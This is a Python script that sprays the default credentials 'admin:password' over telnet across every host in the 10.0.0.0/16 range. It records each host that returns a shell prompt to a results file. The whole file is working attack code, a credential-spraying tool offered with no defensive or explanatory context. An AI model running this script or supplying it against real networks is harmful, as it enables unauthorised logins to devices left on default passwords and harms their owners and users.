import telnetlib
import socket
import ipaddress
import time

# Settings
subnet = ipaddress.IPv4Network("10.0.0.0/16")
username = "admin"
password = "password"
timeout = 3  # seconds
sleep_between_attempts = 0.2  # seconds

# Output file for successful logins
output_file = "telnet_successful_logins.txt"

print(f"[+] Starting telnet spray across {subnet} with credentials: {username}:{password}\n")

for ip in subnet.hosts():  # skips network and broadcast automatically
    ip_str = str(ip)
    try:
        print(f"[*] Trying {ip_str}...", end='', flush=True)
        tn = telnetlib.Telnet(ip_str, 23, timeout=timeout)

        tn.read_until(b"login: ", timeout=timeout)
        tn.write(username.encode('ascii') + b"\n")

        tn.read_until(b"Password: ", timeout=timeout)
        tn.write(password.encode('ascii') + b"\n")

        time.sleep(1)
        output = tn.read_until(b"$", timeout=timeout)

        if b"$" in output or b"#" in output or b">" in output:
            print(f" [SUCCESS]")
            with open(output_file, "a") as f:
                f.write(f"{ip_str} - SUCCESS\n")
        else:
            print(" [FAILED]")

        tn.close()

    except (socket.timeout, EOFError, ConnectionRefusedError, ConnectionResetError):
        print(" [NO RESPONSE]")
    except Exception as e:
        print(f" [ERROR: {e}]")

    time.sleep(sleep_between_attempts)

print(f"\n[+] Scan complete. Results saved to {output_file}")
